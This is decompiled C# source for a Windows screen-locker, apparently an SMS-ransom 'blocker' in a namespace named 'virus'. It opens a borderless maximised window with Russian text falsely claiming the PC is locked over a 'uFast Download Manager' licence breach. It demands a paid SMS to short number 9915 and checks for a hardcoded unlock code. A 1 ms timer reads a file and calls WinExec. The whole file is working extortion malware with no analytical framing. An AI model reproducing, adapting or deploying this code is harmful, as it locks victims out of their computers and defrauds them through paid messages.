using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace virus;

public class Form1 : Form
{
	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Label label3;

	private Button button1;

	private Label label4;

	private PictureBox pictureBox2;

	private PictureBox pictureBox1;

	private Timer timer1;

	private IContainer components;

	public Form1()
	{
		try
		{
			InitializeComponent();
			return;
		}
		catch
		{
			//try-fault
			((Form)this).Dispose(true);
			throw;
		}
	}

	private void method_0()
	{
		components?.Dispose();
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0209: Unknown result type (might be due to invalid IL or missing references)
		//IL_0213: Expected O, but got Unknown
		//IL_02ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b7: Expected O, but got Unknown
		//IL_0361: Unknown result type (might be due to invalid IL or missing references)
		//IL_036b: Expected O, but got Unknown
		//IL_042b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0435: Expected O, but got Unknown
		components = new Container();
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		label3 = new Label();
		button1 = new Button();
		label4 = new Label();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		timer1 = new Timer(components);
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		label1.set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		Color black = Color.Black;
		((Control)label1).set_ForeColor(black);
		Point location = new Point(193, 18);
		((Control)label1).set_Location(location);
		((Control)label1).set_Name("label1");
		Size size = new Size(394, 33);
		((Control)label1).set_Size(size);
		((Control)label1).set_TabIndex(7);
		label1.set_Text("КОМП ЗАБЛОКИРОВАН!!!");
		label2.set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		Color black2 = Color.Black;
		((Control)label2).set_ForeColor(black2);
		Point location2 = new Point(2, 51);
		((Control)label2).set_Location(location2);
		((Control)label2).set_Name("label2");
		Size size2 = new Size(794, 75);
		((Control)label2).set_Size(size2);
		((Control)label2).set_TabIndex(8);
		label2.set_Text("Доступ к компу заблокирован в связи с нарушением лицензионного\r\nсоглашения программы uFast Download Manager.\r\nВам необходимо активировать вашу копию чтоб разблокировать комп!");
		Color white = Color.White;
		((TextBoxBase)textBox1).set_BackColor(white);
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)1);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
		Color black3 = Color.Black;
		((TextBoxBase)textBox1).set_ForeColor(black3);
		Point location3 = new Point(340, 309);
		((Control)textBox1).set_Location(location3);
		((Control)textBox1).set_Name("textBox1");
		textBox1.set_PasswordChar('*');
		Size size3 = new Size(175, 31);
		((Control)textBox1).set_Size(size3);
		((Control)textBox1).set_TabIndex(9);
		label3.set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		Color black4 = Color.Black;
		((Control)label3).set_ForeColor(black4);
		Point location4 = new Point(45, 177);
		((Control)label3).set_Location(location4);
		((Control)label3).set_Name("label3");
		Size size4 = new Size(739, 93);
		((Control)label3).set_Size(size4);
		((Control)label3).set_TabIndex(10);
		label3.set_Text("Чтобы получить регистрационный код отправите смс \r\nна номер 9915 с текстом K+9662221\r\nВ ответ вы получите сообщение с  кодом активации");
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		Color black5 = Color.Black;
		((Control)button1).set_ForeColor(black5);
		Point location5 = new Point(521, 309);
		((Control)button1).set_Location(location5);
		((Control)button1).set_Name("button1");
		Size size5 = new Size(143, 31);
		((Control)button1).set_Size(size5);
		((Control)button1).set_TabIndex(11);
		((ButtonBase)button1).set_Text("АКТИВИРОВАТЬ");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		label4.set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		Color black6 = Color.Black;
		((Control)label4).set_ForeColor(black6);
		Point location6 = new Point(6, 311);
		((Control)label4).set_Location(location6);
		((Control)label4).set_Name("label4");
		Size size6 = new Size(328, 25);
		((Control)label4).set_Size(size6);
		((Control)label4).set_TabIndex(12);
		label4.set_Text("ВВЕДИТЕ КОД АКТИВАЦИИ ");
		Color black7 = Color.Black;
		((Control)pictureBox2).set_BackColor(black7);
		pictureBox2.set_BorderStyle((BorderStyle)2);
		Point location7 = new Point(-24, 362);
		((Control)pictureBox2).set_Location(location7);
		((Control)pictureBox2).set_Name("pictureBox2");
		Size size7 = new Size(858, 10);
		((Control)pictureBox2).set_Size(size7);
		pictureBox2.set_TabIndex(14);
		pictureBox2.set_TabStop(false);
		Color black8 = Color.Black;
		((Control)pictureBox1).set_BackColor(black8);
		pictureBox1.set_BorderStyle((BorderStyle)2);
		Point location8 = new Point(824, -22);
		((Control)pictureBox1).set_Location(location8);
		((Control)pictureBox1).set_Name("pictureBox1");
		Size size8 = new Size(10, 394);
		((Control)pictureBox1).set_Size(size8);
		pictureBox1.set_TabIndex(15);
		pictureBox1.set_TabStop(false);
		timer1.set_Enabled(true);
		timer1.set_Interval(1);
		timer1.add_Tick((EventHandler)timer1_Tick_1);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Color white2 = Color.White;
		((Form)this).set_BackColor(white2);
		Size clientSize = new Size(830, 545);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("КОМП ЗАБЛОКИРОВАН");
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private unsafe void button1_Click(object sender, EventArgs e)
	{
		_003CModule_003E.virus_002Ef = _003CModule_003E.fopen((sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct6_0), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct5_0));
		if (textBox1.get_Text() == "reg350log" || textBox1.get_Text() == "REG350LOG")
		{
			_003CModule_003E.fprintf(_003CModule_003E.virus_002Ef, (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct8_0), __arglist((sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct7_0)));
		}
		_003CModule_003E.fclose(_003CModule_003E.virus_002Ef);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private unsafe void timer1_Tick_1(object sender, EventArgs e)
	{
		_003CModule_003E.virus_002Ef = _003CModule_003E.fopen((sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct6_0), (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct9_0));
		_003CModule_003E.fscanf(_003CModule_003E.virus_002Ef, (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct10_0), __arglist((int*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.virus_002Ev)));
		if (_003CModule_003E.virus_002Ev != 0)
		{
			_003CModule_003E.WinExec((sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref _003CModule_003E.struct11_0), 5u);
			((Form)this).Close();
		}
		_003CModule_003E.fclose(_003CModule_003E.virus_002Ef);
	}

	protected override void Dispose([MarshalAs(UnmanagedType.U1)] bool disposing)
	{
		if (disposing)
		{
			try
			{
				method_0();
				return;
			}
			finally
			{
				((Form)this).Dispose(true);
			}
		}
		((Form)this).Dispose(false);
	}
}
